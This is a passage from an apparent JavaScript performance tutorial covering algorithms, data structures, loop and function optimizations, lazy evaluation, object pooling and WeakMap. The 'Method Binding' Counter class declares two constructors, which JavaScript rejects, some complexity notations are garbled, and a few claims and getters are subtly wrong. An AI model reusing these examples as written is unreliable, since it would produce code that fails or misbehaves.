    } else if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }
  
  return result;
}

// Find insertion point
function findInsertPosition(arr, target) {
  let left = 0;
  let right = arr.length;
  
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    
    if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid;
    }
  }
  
  return left;
}
```

#### Dynamic Programming

```javascript
// Problem: Coin change - minimum coins to make amount
function coinChange(coins, amount) {
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0;
  
  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (i >= coin) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }
  
  return dp[amount] === Infinity ? -1 : dp[amount];
}

// Problem: Longest increasing subsequence
function lengthOfLIS(nums) {
  if (nums.length === 0) return 0;
  
  const dp = new Array(nums.length).fill(1);
  
  for (let i = 1; i < nums.length; i++) {
    for (let j = 0; j < i; j++) {
      if (nums[i] > nums[j]) {
        dp[i] = Math.max(dp[i], dp[j] + 1);
      }
    }
  }
  
  return Math.max(...dp);
}

// Problem: 0/1 Knapsack
function knapsack(weights, values, capacity) {
  const n = weights.length;
  const dp = Array(n + 1).fill(null)
    .map(() => Array(capacity + 1).fill(0));
  
  for (let i = 1; i <= n; i++) {
    for (let w = 0; w <= capacity; w++) {
      if (weights[i - 1] <= w) {
        dp[i][w] = Math.max(
          values[i - 1] + dp[i - 1][w - weights[i - 1]],
          dp[i - 1][w]
        );
      } else {
        dp[i][w] = dp[i - 1][w];
      }
    }
  }
  
  return dp[n][capacity];
}
```

### Choosing Appropriate Data Structures

The right data structure dramatically affects performance.

#### Array vs Set

```javascript
// Problem: Check membership
const data = Array.from({ length: 100000 }, (_, i) => i);

// Array: O(n) lookup
console.time('Array lookup');
for (let i = 0; i < 1000; i++) {
  data.includes(50000);
}
console.timeEnd('Array lookup');

// Set: O(1) lookup
const dataSet = new Set(data);

console.time('Set lookup');
for (let i = 0; i < 1000; i++) {
  dataSet.has(50000);
}
console.timeEnd('Set lookup');

// Use Array when:
// - Order matters
// - Need indexed access
// - Duplicates allowed
// - Iterating frequently

// Use Set when:
// - Checking membership frequently
// - Need unique values
// - No duplicates allowed
// - Order doesn't matter
```

#### Array vs Map

```javascript
// Problem: Key-value storage

// Object/Map comparison
const objStore = {};
const mapStore = new Map();

// Objects are slower with many properties
console.time('Object set');
for (let i = 0; i < 100000; i++) {
  objStore[`key${i}`] = i;
}
console.timeEnd('Object set');

console.time('Map set');
for (let i = 0; i < 100000; i++) {
  mapStore.set(`key${i}`, i);
}
console.timeEnd('Map set');

// Maps are faster for frequent additions/deletions
console.time('Object delete');
for (let i = 0; i < 10000; i++) {
  delete objStore[`key${i}`];
}
console.timeEnd('Object delete');

console.time('Map delete');
for (let i = 0; i < 10000; i++) {
  mapStore.delete(`key${i}`);
}
console.timeEnd('Map delete');

// Use Object when:
// - Simple key-value pairs
// - Keys are strings
// - JSON serialization needed
// - Small number of properties

// Use Map when:
// - Frequent additions/deletions
// - Non-string keys needed
// - Need to iterate keys
// - Large number of entries
```

#### Array vs Linked List

```javascript
// Linked List implementation
class Node {
  constructor(value) {
    this.value = value;
    this.next = null;
  }
}

class LinkedList {
  constructor() {
    this.head = null;
    this.tail = null;
    this.size = 0;
  }
  
  // O(1)
  prepend(value) {
    const node = new Node(value);
    node.next = this.head;
    this.head = node;
    if (!this.tail) this.tail = node;
    this.size++;
  }
  
  // O(1)
  append(value) {
    const node = new Node(value);
    if (!this.tail) {
      this.head = this.tail = node;
    } else {
      this.tail.next = node;
      this.tail = node;
    }
    this.size++;
  }
  
  // O(n)
  get(index) {
    let current = this.head;
    for (let i = 0; i < index && current; i++) {
      current = current.next;
    }
    return current?.value;
  }
}

// Comparison
const arr = [];
const list = new LinkedList();

// Array: O(1) for append (amortized)
console.time('Array append');
for (let i = 0; i < 100000; i++) {
  arr.push(i);
}
console.timeEnd('Array append');

// Linked List: O(1) for append
console.time('List append');
for (let i = 0; i < 100000; i++) {
  list.append(i);
}
console.timeEnd('List append');

// Array: O(n) for prepend
console.time('Array prepend');
for (let i = 0; i < 1000; i++) {
  arr.unshift(i);
}
console.timeEnd('Array prepend');

// Linked List: O(1) for prepend
console.time('List prepend');
for (let i = 0; i < 1000; i++) {
  list.prepend(i);
}
console.timeEnd('List prepend');

// Use Array when:
// - Random access needed (O(1))
// - Memory locality important
// - Simple iteration
// - Most operations are at end

// Use Linked List when:
// - Frequent insertions/deletions at beginning
// - No random access needed
// - Don't know size in advance
// - Memory fragmentation acceptable
```

#### Stack vs Queue

```javascript
// Stack (LIFO) using Array
class Stack {
  constructor() {
    this.items = [];
  }
  
  push(item) {
    this.items.push(item); // O(1)
  }
  
  pop() {
    return this.items.pop(); // O(1)
  }
  
  peek() {
    return this.items[this.items.length - 1]; // O(1)
  }
}

// Queue (FIFO) using Array
class Queue {
  constructor() {
    this.items = [];
  }
  
  enqueue(item) {
    this.items.push(item); // O(1)
  }
  
  dequeue() {
    return this.items.shift(); // O(n) - slow!
  }
}

// Better Queue using two stacks
class QueueFast {
  constructor() {
    this.inbox = [];
    this.outbox = [];
  }
  
  enqueue(item) {
    this.inbox.push(item); // O(1)
  }
  
  dequeue() {
    if (this.outbox.length === 0) {
      while (this.inbox.length > 0) {
        this.outbox.push(this.inbox.pop());
      }
    }
    return this.outbox.pop(); // O(1) amortized
  }
}

// Use Stack when:
// - LIFO order needed
// - Backtracking (undo/redo)
// - Function call stack simulation
// - Expression evaluation

// Use Queue when:
// - FIFO order needed
// - Breadth-first search
// - Task scheduling
// - Event handling
```

#### Priority Queue (Heap)

```javascript
// Min Heap implementation
class MinHeap {
  constructor() {
    this.heap = [];
  }
  
  insert(value) {
    this.heap.push(value);
    this.bubbleUp(this.heap.length - 1);
  }
  
  extractMin() {
    if (this.heap.length === 0) return null;
    if (this.heap.length === 1) return this.heap.pop();
    
    const min = this.heap[0];
    this.heap[0] = this.heap.pop();
    this.bubbleDown(0);
    return min;
  }
  
  bubbleUp(index) {
    while (index > 0) {
      const parentIndex = Math.floor((index - 1) / 2);
      
      if (this.heap[index] >= this.heap[parentIndex]) break;
      
      [this.heap[index], this.heap[parentIndex]] = 
        [this.heap[parentIndex], this.heap[index]];
      
      index = parentIndex;
    }
  }
  
  bubbleDown(index) {
    while (true) {
      const leftChild = 2 * index + 1;
      const rightChild = 2 * index + 2;
      let smallest = index;
      
      if (leftChild < this.heap.length && 
          this.heap[leftChild] < this.heap[smallest]) {
        smallest = leftChild;
      }
      
      if (rightChild < this.heap.length && 
          this.heap[rightChild] < this.heap[smallest]) {
        smallest = rightChild;
      }
      
      if (smallest === index) break;
      
      [this.heap[index], this.heap[smallest]] = 
        [this.heap[smallest], this.heap[index]];
      
      index = smallest;
    }
  }
  
  peek() {
    return this.heap[0];
  }
}

// Use Priority Queue when:
// - Need min/max element quickly
// - Dijkstra's algorithm
// - Job scheduling by priority
// - Event simulation
// - Median maintenance
```

---

## Summary

This document covered Performance Optimization:

**JavaScript Engine Optimization:**

- V8 optimization tips (monomorphic code, consistent shapes, array optimization)
- JIT compilation (Ignition interpreter, TurboFan compiler)
- Hidden classes and inline caching (property access optimization)
- Deoptimization triggers (type changes, arguments, try-catch, sparse arrays)

**Algorithm Optimization:**

- Time complexity (O(1), O(log n), O(n), O(n log n), O(nÂ²), O(2â¿))
- Space complexity (constant, linear, quadratic)
- Common patterns (sliding window, two pointers, binary search, dynamic programming)
- Data structure selection (Array, Set, Map, LinkedList, Stack, Queue, Heap)

Understanding these concepts helps write performant JavaScript code.

---

**Related Topics:**

- Web Performance APIs
- Memory Profiling
- Bundle Optimization
- Lazy Loading
- Code Splitting
# Code & Memory


## 23.3 Code-Level Optimization

Code-level optimizations focus on writing efficient code patterns that execute faster.

### Loop Optimization

Loops are often the performance bottleneck in applications.

#### Cache Array Length

```javascript
const arr = Array.from({ length: 100000 }, (_, i) => i);

// SLOW: Access length property each iteration
console.time('No caching');
let sum1 = 0;
for (let i = 0; i < arr.length; i++) {
  sum1 += arr[i];
}
console.timeEnd('No caching');

// FAST: Cache length
console.time('With caching');
let sum2 = 0;
const len = arr.length;
for (let i = 0; i < len; i++) {
  sum2 += arr[i];
}
console.timeEnd('With caching');

// FASTEST: For-of (optimized by engine)
console.time('For-of');
let sum3 = 0;
for (const num of arr) {
  sum3 += num;
}
console.timeEnd('For-of');
```

#### Loop Unrolling

```javascript
// Standard loop
function sumStandard(arr) {
  let sum = 0;
  for (let i = 0; i < arr.length; i++) {
    sum += arr[i];
  }
  return sum;
}

// Unrolled loop - processes 4 items per iteration
function sumUnrolled(arr) {
  let sum = 0;
  const len = arr.length;
  const remainder = len % 4;
  
  // Process remainder first
  for (let i = 0; i < remainder; i++) {
    sum += arr[i];
  }
  
  // Process 4 items at a time
  for (let i = remainder; i < len; i += 4) {
    sum += arr[i];
    sum += arr[i + 1];
    sum += arr[i + 2];
    sum += arr[i + 3];
  }
  
  return sum;
}

// Benchmark
const largeArr = Array.from({ length: 1000000 }, (_, i) => i);

console.time('Standard');
sumStandard(largeArr);
console.timeEnd('Standard');

console.time('Unrolled');
sumUnrolled(largeArr);
console.timeEnd('Unrolled');

// Note: Modern engines optimize simple loops well,
// unrolling is mainly useful for complex operations
```

#### Avoiding Function Calls in Loops

```javascript
// SLOW: Function call in each iteration
function processDataSlow(arr) {
  const results = [];
  for (let i = 0; i < arr.length; i++) {
    results.push(expensiveOperation(arr[i]));
  }
  return results;
}

function expensiveOperation(x) {
  return x * 2 + 10;
}

// FAST: Inline the operation
function processDataFast(arr) {
  const results = [];
  for (let i = 0; i < arr.length; i++) {
    results.push(arr[i] * 2 + 10);
  }
  return results;
}

// FASTEST: Use map for simple transformations
function processDataFastest(arr) {
  return arr.map(x => x * 2 + 10);
}
```

#### Reverse Loops

```javascript
// Sometimes counting down is slightly faster
const arr = Array.from({ length: 100000 }, (_, i) => i);

// Standard forward loop
console.time('Forward');
let sum1 = 0;
for (let i = 0; i < arr.length; i++) {
  sum1 += arr[i];
}
console.timeEnd('Forward');

// Reverse loop - one less comparison
console.time('Reverse');
let sum2 = 0;
for (let i = arr.length - 1; i >= 0; i--) {
  sum2 += arr[i];
}
console.timeEnd('Reverse');

// While decrement - minimal overhead
console.time('While');
let sum3 = 0;
let i = arr.length;
while (i--) {
  sum3 += arr[i];
}
console.timeEnd('While');
```

#### Breaking Early

```javascript
// Find first match
function findFirstMatch(arr, predicate) {
  for (let i = 0; i < arr.length; i++) {
    if (predicate(arr[i])) {
      return arr[i]; // Exit immediately
    }
  }
  return null;
}

// SLOW: Processes entire array
const slowResult = arr.filter(x => x > 50000)[0];

// FAST: Stops at first match
const fastResult = arr.find(x => x > 50000);

// Check if any match exists
// SLOW: Processes entire array
const hasMatchSlow = arr.filter(x => x > 50000).length > 0;

// FAST: Stops at first match
const hasMatchFast = arr.some(x => x > 50000);
```

#### Avoiding Nested Loops

```javascript
const data1 = Array.from({ length: 1000 }, (_, i) => ({ id: i, value: i * 2 }));
const data2 = Array.from({ length: 1000 }, (_, i) => ({ id: i, name: `Item ${i}` }));

// BAD: O(nÂ²) - nested loops
console.time('Nested loops');
const result1 = data1.map(item1 => {
  const match = data2.find(item2 => item2.id === item1.id);
  return { ...item1, ...match };
});
console.timeEnd('Nested loops');

// GOOD: O(n) - use hash map
console.time('Hash map');
const map2 = new Map(data2.map(item => [item.id, item]));
const result2 = data1.map(item1 => {
  const match = map2.get(item1.id);
  return { ...item1, ...match };
});
console.timeEnd('Hash map');
```

### Function Call Overhead

Function calls have overhead; minimize them in hot code paths.

#### Inline vs Function Calls

```javascript
const arr = Array.from({ length: 100000 }, (_, i) => i);

// SLOW: Function call overhead
function addOne(x) {
  return x + 1;
}

console.time('With function calls');
const result1 = arr.map(addOne);
console.timeEnd('With function calls');

// FAST: Inline function
console.time('Inline');
const result2 = arr.map(x => x + 1);
console.timeEnd('Inline');

// FASTER: Manual loop with inline operation
console.time('Manual inline');
const result3 = new Array(arr.length);
for (let i = 0; i < arr.length; i++) {
  result3[i] = arr[i] + 1;
}
console.timeEnd('Manual inline');
```

#### Memoization for Expensive Functions

```javascript
// Expensive function
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

// Memoized version
const fibMemo = (() => {
  const cache = {};
  
  return function fib(n) {
    if (n in cache) return cache[n];
    if (n <= 1) return n;
    
    cache[n] = fib(n - 1) + fib(n - 2);
    return cache[n];
  };
})();

console.time('No memoization');
fibonacci(35);
console.timeEnd('No memoization'); // Very slow

console.time('With memoization');
fibMemo(35);
console.timeEnd('With memoization'); // Much faster

// Generic memoization
function memoize(fn) {
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }
    
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const expensiveCalc = (a, b, c) => {
  // Simulate expensive operation
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
    result += a + b + c;
  }
  return result;
};

const memoizedCalc = memoize(expensiveCalc);

console.time('First call');
memoizedCalc(1, 2, 3);
console.timeEnd('First call');

console.time('Cached call');
memoizedCalc(1, 2, 3);
console.timeEnd('Cached call'); // Instant
```

#### Reduce Recursion Depth

```javascript
// SLOW: Deep recursion
function sumRecursive(arr, index = 0) {
  if (index >= arr.length) return 0;
  return arr[index] + sumRecursive(arr, index + 1);
}

// FAST: Iterative
function sumIterative(arr) {
  let sum = 0;
  for (let i = 0; i < arr.length; i++) {
    sum += arr[i];
  }
  return sum;
}

// FAST: Tail-recursive (optimized by some engines)
function sumTailRecursive(arr, index = 0, acc = 0) {
  if (index >= arr.length) return acc;
  return sumTailRecursive(arr, index + 1, acc + arr[index]);
}

const arr = Array.from({ length: 10000 }, (_, i) => i);

console.time('Recursive');
// sumRecursive(arr); // May cause stack overflow
console.timeEnd('Recursive');

console.time('Iterative');
sumIterative(arr);
console.timeEnd('Iterative');

console.time('Tail recursive');
sumTailRecursive(arr);
console.timeEnd('Tail recursive');
```

#### Method Binding

```javascript
class Counter {
  constructor() {
    this.count = 0;
  }
  
  // SLOW: Binding in render/loop
  incrementSlow() {
    return () => {
      this.count++;
    };
  }
  
  // FAST: Bind in constructor
  constructor() {
    this.count = 0;
    this.incrementFast = this.incrementFast.bind(this);
  }
  
  incrementFast() {
    this.count++;
  }
  
  // FASTEST: Arrow function as class field
  incrementFastest = () => {
    this.count++;
  }
}

// Benchmark
const counter = new Counter();

console.time('New binding each time');
for (let i = 0; i < 100000; i++) {
  const fn = counter.incrementSlow();
  fn();
}
console.timeEnd('New binding each time');

console.time('Pre-bound');
for (let i = 0; i < 100000; i++) {
  counter.incrementFast();
}
console.timeEnd('Pre-bound');

console.time('Arrow function');
for (let i = 0; i < 100000; i++) {
  counter.incrementFastest();
}
console.timeEnd('Arrow function');
```

### Variable Scope Optimization

Variable access speed depends on scope depth.

#### Local vs Global Variables

```javascript
// Global variable
let globalCounter = 0;

// SLOW: Accessing global variable
function incrementGlobal() {
  for (let i = 0; i < 1000000; i++) {
    globalCounter++;
  }
}

// FAST: Using local variable
function incrementLocal() {
  let localCounter = 0;
  for (let i = 0; i < 1000000; i++) {
    localCounter++;
  }
  return localCounter;
}

console.time('Global access');
incrementGlobal();
console.timeEnd('Global access');

console.time('Local access');
incrementLocal();
console.timeEnd('Local access');
```

#### Cache Object Properties

```javascript
const obj = {
  deeply: {
    nested: {
      property: {
        value: 42
      }
    }
  }
};

// SLOW: Repeated property access
console.time('Repeated access');
let sum1 = 0;
for (let i = 0; i < 100000; i++) {
  sum1 += obj.deeply.nested.property.value;
}
console.timeEnd('Repeated access');

// FAST: Cache property
console.time('Cached property');
let sum2 = 0;
const cached = obj.deeply.nested.property.value;
for (let i = 0; i < 100000; i++) {
  sum2 += cached;
}
console.timeEnd('Cached property');
```

#### Closure Scope

```javascript
// Closure captures outer variables
function createCounter() {
  let count = 0;
  const cache = new Array(1000).fill(0);
  
  return {
    increment() {
      // Accesses both count and cache from closure
      count++;
      cache[count % 1000] = count;
    },
    
    getCount() {
      return count;
    }
  };
}

// Each counter has its own closure
const counter1 = createCounter();
const counter2 = createCounter();

// Optimize: Don't capture unnecessary variables
function createOptimizedCounter() {
  let count = 0;
  
  return {
    increment() {
      count++; // Only captures count, not unnecessary data
    },
    
    getCount() {
      return count;
    }
  };
}
```

### Avoiding Unnecessary Work

Don't compute what you don't need.

#### Short-Circuit Evaluation

```javascript
// Use && and || to skip unnecessary evaluations

// BAD: Always evaluates both
function checkAndProcess(data) {
  if (isValid(data) & shouldProcess(data)) { // Bitwise &, not logical &&
    process(data);
  }
}

// GOOD: Short-circuits
function checkAndProcessOptimized(data) {
  if (isValid(data) && shouldProcess(data)) { // Logical &&
    process(data); // shouldProcess not called if isValid returns false
  }
}

// Practical example: Expensive validation
function validateAndSave(user) {
  // SLOW: Validates everything even if basic checks fail
  if (validateEmail(user.email) & 
      validatePassword(user.password) & 
      checkDatabaseConstraints(user)) {
    saveUser(user);
  }
  
  // FAST: Stops at first failure
  if (validateEmail(user.email) && 
      validatePassword(user.password) && 
      checkDatabaseConstraints(user)) {
    saveUser(user);
  }
}
```

#### Memoization

```javascript
// Cache expensive computations
class DataProcessor {
  constructor() {
    this.cache = new Map();
  }
  
  process(data) {
    const key = this.getCacheKey(data);
    
    if (this.cache.has(key)) {
      console.log('Cache hit');
      return this.cache.get(key);
    }
    
    console.log('Computing...');
    const result = this.expensiveComputation(data);
    this.cache.set(key, result);
    return result;
  }
  
  getCacheKey(data) {
    return JSON.stringify(data);
  }
  
  expensiveComputation(data) {
    // Simulate expensive operation
    let result = 0;
    for (let i = 0; i < 1000000; i++) {
      result += data.value * i;
    }
    return result;
  }
}

const processor = new DataProcessor();

console.time('First call');
processor.process({ value: 5 });
console.timeEnd('First call');

console.time('Cached call');
processor.process({ value: 5 });
console.timeEnd('Cached call');
```

#### Early Returns

```javascript
// BAD: Processes everything
function processUserSlow(user) {
  let result = null;
  
  if (user && user.active) {
    if (user.age >= 18) {
      if (user.verified) {
        result = {
          id: user.id,
          name: user.name,
          status: 'approved'
        };
      }
    }
  }
  
  return result;
}

// GOOD: Returns early
function processUserFast(user) {
  if (!user) return null;
  if (!user.active) return null;
  if (user.age < 18) return null;
  if (!user.verified) return null;
  
  return {
    id: user.id,
    name: user.name,
    status: 'approved'
  };
}

// Guard clauses prevent nested conditions
function calculateDiscount(order) {
  // Early returns for invalid cases
  if (!order) return 0;
  if (order.total < 0) return 0;
  if (!order.customer) return 0;
  if (!order.customer.isPremium) return order.total * 0.05;
  
  // Complex calculation only for valid premium customers
  const baseDiscount = order.total * 0.10;
  const loyaltyBonus = order.customer.yearsActive * 0.01;
  return Math.min(baseDiscount * (1 + loyaltyBonus), order.total * 0.3);
}
```

#### Conditional Compilation

```javascript
// Development vs Production
const isDevelopment = process.env.NODE_ENV === 'development';

function processData(data) {
  // BAD: Always checks environment
  if (process.env.NODE_ENV === 'development') {
    console.log('Processing:', data);
  }
  
  return data.map(x => x * 2);
}

// GOOD: Check once at module load
const DEBUG = process.env.NODE_ENV === 'development';

function processDataOptimized(data) {
  if (DEBUG) {
    console.log('Processing:', data);
  }
  
  return data.map(x => x * 2);
}

// BEST: Remove in production build (using bundler)
// Bundler will remove this code in production
if (__DEV__) {
  console.log('Development mode');
}
```

### Lazy Evaluation

Defer computation until actually needed.

#### Lazy Initialization

```javascript
class ExpensiveResource {
  constructor() {
    // DON'T initialize expensive resources immediately
    this._connection = null;
    this._cache = null;
  }
  
  // Initialize only when first accessed
  get connection() {
    if (!this._connection) {
      console.log('Initializing connection...');
      this._connection = this.createConnection();
    }
    return this._connection;
  }
  
  get cache() {
    if (!this._cache) {
      console.log('Initializing cache...');
      this._cache = new Map();
    }
    return this._cache;
  }
  
  createConnection() {
    // Expensive connection setup
    return { connected: true };
  }
}

const resource = new ExpensiveResource();
// Nothing initialized yet

// Only initializes when used
resource.connection; // Logs: "Initializing connection..."
resource.cache; // Logs: "Initializing cache..."
```

#### Generators for Lazy Sequences

```javascript
// Eager evaluation - processes all immediately
function eagerRange(start, end) {
  const result = [];
  for (let i = start; i <= end; i++) {
    result.push(i);
  }
  return result;
}

// Lazy evaluation - processes on demand
function* lazyRange(start, end) {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

// Eager: Creates huge array in memory
console.time('Eager');
const eagerResult = eagerRange(1, 1000000)
  .filter(x => x % 2 === 0)
  .map(x => x * 2)
  .slice(0, 10);
console.timeEnd('Eager');

// Lazy: Only processes what's needed
console.time('Lazy');
function* lazyFilter(iterable, predicate) {
  for (const item of iterable) {
    if (predicate(item)) yield item;
  }
}

function* lazyMap(iterable, mapper) {
  for (const item of iterable) {
    yield mapper(item);
  }
}

function take(iterable, n) {
  const result = [];
  for (const item of iterable) {
    if (result.length >= n) break;
    result.push(item);
  }
  return result;
}

const lazyResult = take(
  lazyMap(
    lazyFilter(lazyRange(1, 1000000), x => x % 2 === 0),
    x => x * 2
  ),
  10
);
console.timeEnd('Lazy');
```

#### Lazy Properties

```javascript
class DataAnalyzer {
  constructor(data) {
    this.data = data;
    // Don't compute statistics immediately
  }
  
  // Compute only when accessed
  get mean() {
    if (!this._mean) {
      console.log('Computing mean...');
      this._mean = this.data.reduce((a, b) => a + b) / this.data.length;
    }
    return this._mean;
  }
  
  get median() {
    if (!this._median) {
      console.log('Computing median...');
      const sorted = [...this.data].sort((a, b) => a - b);
      const mid = Math.floor(sorted.length / 2);
      this._median = sorted.length % 2 === 0
        ? (sorted[mid - 1] + sorted[mid]) / 2
        : sorted[mid];
    }
    return this._median;
  }
  
  get stdDev() {
    if (!this._stdDev) {
      console.log('Computing standard deviation...');
      const mean = this.mean;
      const squareDiffs = this.data.map(x => Math.pow(x - mean, 2));
      this._stdDev = Math.sqrt(
        squareDiffs.reduce((a, b) => a + b) / this.data.length
      );
    }
    return this._stdDev;
  }
}

const analyzer = new DataAnalyzer([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);

// Only computes what's accessed
console.log(analyzer.mean);   // Computes mean
console.log(analyzer.mean);   // Uses cached value
console.log(analyzer.median); // Computes median
```

#### Lazy Loading Modules

```javascript
// SLOW: Load everything upfront
import heavyLibrary from 'heavy-library';
import anotherLibrary from 'another-library';

function processData(data) {
  if (data.type === 'special') {
    return heavyLibrary.process(data);
  }
  return data;
}

// FAST: Load only when needed
async function processDataLazy(data) {
  if (data.type === 'special') {
    const { default: heavyLibrary } = await import('heavy-library');
    return heavyLibrary.process(data);
  }
  return data;
}

// Lazy component loading in React
const HeavyComponent = React.lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <React.Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </React.Suspense>
  );
}
```

---

## 23.4 Memory Optimization

Efficient memory usage improves performance and prevents leaks.

### Reducing Memory Allocations

Minimize object creation in hot code paths.

#### Reuse Objects

```javascript
// BAD: Creates new object each time
function processPointSlow(x, y) {
  return { x, y, distance: Math.sqrt(x * x + y * y) };
}

const points = [];
for (let i = 0; i < 100000; i++) {
  points.push(processPointSlow(i, i + 1)); // 100,000 allocations
}

// GOOD: Reuse object
const pointCache = { x: 0, y: 0, distance: 0 };

function processPointFast(x, y, result = pointCache) {
  result.x = x;
  result.y = y;
  result.distance = Math.sqrt(x * x + y * y);
  return result;
}

// Use with care - caller must copy if needed
```

#### String Concatenation

```javascript
// BAD: Creates many intermediate strings
console.time('Concatenation');
let str1 = '';
for (let i = 0; i < 10000; i++) {
  str1 += i.toString(); // Creates new string each time
}
console.timeEnd('Concatenation');

// GOOD: Use array join
console.time('Array join');
const parts = [];
for (let i = 0; i < 10000; i++) {
  parts.push(i.toString());
}
const str2 = parts.join('');
console.timeEnd('Array join');

// BETTER: Template literals for small strings
console.time('Template');
const str3 = Array.from({ length: 10000 }, (_, i) => i).join('');
console.timeEnd('Template');
```

#### Array Pre-allocation

```javascript
// BAD: Dynamic growth
console.time('Dynamic');
const arr1 = [];
for (let i = 0; i < 100000; i++) {
  arr1.push(i); // May need reallocation
}
console.timeEnd('Dynamic');

// GOOD: Pre-allocate
console.time('Pre-allocated');
const arr2 = new Array(100000);
for (let i = 0; i < 100000; i++) {
  arr2[i] = i; // No reallocation needed
}
console.timeEnd('Pre-allocated');

// BEST: Use fill if initializing to same value
console.time('Fill');
const arr3 = new Array(100000).fill(0);
console.timeEnd('Fill');
```

#### Typed Arrays for Numeric Data

```javascript
// Regular array - stores any type
const regularArray = new Array(1000000);
for (let i = 0; i < 1000000; i++) {
  regularArray[i] = i;
}

// Typed array - stores only specific numeric type
const typedArray = new Int32Array(1000000);
for (let i = 0; i < 1000000; i++) {
  typedArray[i] = i;
}

console.log('Regular array:', regularArray.length * 8, 'bytes (estimated)');
console.log('Typed array:', typedArray.byteLength, 'bytes');

// Benchmark operations
const numbers = Array.from({ length: 100000 }, (_, i) => i);

console.time('Regular array sum');
let sum1 = 0;
for (let i = 0; i < numbers.length; i++) {
  sum1 += numbers[i];
}
console.timeEnd('Regular array sum');

const typedNumbers = new Int32Array(numbers);

console.time('Typed array sum');
let sum2 = 0;
for (let i = 0; i < typedNumbers.length; i++) {
  sum2 += typedNumbers[i];
}
console.timeEnd('Typed array sum');
```

### Object Pooling

Reuse objects instead of creating and destroying them.

#### Basic Object Pool

```javascript
class ObjectPool {
  constructor(factory, reset, initialSize = 10) {
    this.factory = factory;
    this.reset = reset;
    this.pool = [];
    
    // Pre-create objects
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(factory());
    }
  }
  
  acquire() {
    return this.pool.length > 0 
      ? this.pool.pop() 
      : this.factory();
  }
  
  release(obj) {
    this.reset(obj);
    this.pool.push(obj);
  }
  
  size() {
    return this.pool.length;
  }
}

// Particle system example
class Particle {
  constructor() {
    this.x = 0;
    this.y = 0;
    this.vx = 0;
    this.vy = 0;
    this.life = 0;
    this.active = false;
  }
}

const particlePool = new ObjectPool(
  () => new Particle(),
  (particle) => {
    particle.x = 0;
    particle.y = 0;
    particle.vx = 0;
    particle.vy = 0;
    particle.life = 0;
    particle.active = false;
  },
  100
);

// Game loop
const activeParticles = [];

function spawnParticle(x, y) {
  const particle = particlePool.acquire();
  particle.x = x;
  particle.y = y;
  particle.vx = Math.random() * 2 - 1;
  particle.vy = Math.random() * 2 - 1;
  particle.life = 100;
  particle.active = true;
  activeParticles.push(particle);
}

function updateParticles() {
  for (let i = activeParticles.length - 1; i >= 0; i--) {
    const particle = activeParticles[i];
    
    particle.x += particle.vx;
    particle.y += particle.vy;
    particle.life--;
    
    if (particle.life <= 0) {
      particle.active = false;
      activeParticles.splice(i, 1);
      particlePool.release(particle);
    }
  }
}

// Benchmark
console.time('With pooling');
for (let i = 0; i < 10000; i++) {
  spawnParticle(Math.random() * 800, Math.random() * 600);
  updateParticles();
}
console.timeEnd('With pooling');

console.log('Pool size:', particlePool.size());
```

#### Array Buffer Pool

```javascript
class ArrayBufferPool {
  constructor(bufferSize, initialCount = 5) {
    this.bufferSize = bufferSize;
    this.pool = [];
    
    for (let i = 0; i < initialCount; i++) {
      this.pool.push(new ArrayBuffer(bufferSize));
    }
  }
  
  acquire() {
    return this.pool.length > 0 
      ? this.pool.pop() 
      : new ArrayBuffer(this.bufferSize);
  }
  
  release(buffer) {
    if (buffer.byteLength === this.bufferSize) {
      // Clear buffer
      new Uint8Array(buffer).fill(0);
      this.pool.push(buffer);
    }
  }
}

const bufferPool = new ArrayBufferPool(1024 * 1024); // 1MB buffers

function processData(data) {
  const buffer = bufferPool.acquire();
  const view = new Uint8Array(buffer);
  
  // Process data using buffer
  for (let i = 0; i < data.length; i++) {
    view[i] = data[i] * 2;
  }
  
  // Use buffer...
  const result = view.slice(0, data.length);
  
  // Return to pool
  bufferPool.release(buffer);
  
  return result;
}
```

#### Connection Pool

```javascript
class ConnectionPool {
  constructor(createConnection, maxSize = 10) {
    this.createConnection = createConnection;
    this.maxSize = maxSize;
    this.available = [];
    this.inUse = new Set();
  }
  
  async acquire() {
    // Use available connection
    if (this.available.length > 0) {
      const conn = this.available.pop();
      this.inUse.add(conn);
      return conn;
    }
    
    // Create new if under limit
    if (this.inUse.size < this.maxSize) {
      const conn = await this.createConnection();
      this.inUse.add(conn);
      return conn;
    }
    
    // Wait for available connection
    return new Promise((resolve) => {
      const checkAvailable = setInterval(() => {
        if (this.available.length > 0) {
          clearInterval(checkAvailable);
          const conn = this.available.pop();
          this.inUse.add(conn);
          resolve(conn);
        }
      }, 10);
    });
  }
  
  release(conn) {
    this.inUse.delete(conn);
    this.available.push(conn);
  }
  
  async destroy() {
    // Close all connections
    const all = [...this.available, ...this.inUse];
    for (const conn of all) {
      await conn.close();
    }
    this.available = [];
    this.inUse.clear();
  }
}

// Usage
const pool = new ConnectionPool(
  async () => ({
    connected: true,
    query: async (sql) => ({ rows: [] }),
    close: async () => {}
  }),
  5
);

async function performQuery(sql) {
  const conn = await pool.acquire();
  try {
    return await conn.query(sql);
  } finally {
    pool.release(conn);
  }
}
```

### WeakMap/WeakSet Usage

WeakMap and WeakSet hold weak references, allowing garbage collection.

#### WeakMap for Metadata

```javascript
// BAD: Prevents garbage collection
const metadata = new Map();

class User {
  constructor(name) {
    this.name = name;
    metadata.set(this, {
      created: Date.now(),
      loginCount: 0
    });
  }
}

let user = new User('Alice');
user = null; // User object can't be GC'd - metadata holds reference

// GOOD: Allows garbage collection
const weakMetadata = new WeakMap();

class UserOptimized {
  constructor(name) {
    this.name = name;
    weakMetadata.set(this, {
      created: Date.now(),
      loginCount: 0
    });
  }
}

let user2 = new UserOptimized('Bob');
user2 = null; // User object can be GC'd - weakMetadata doesn't prevent it
```

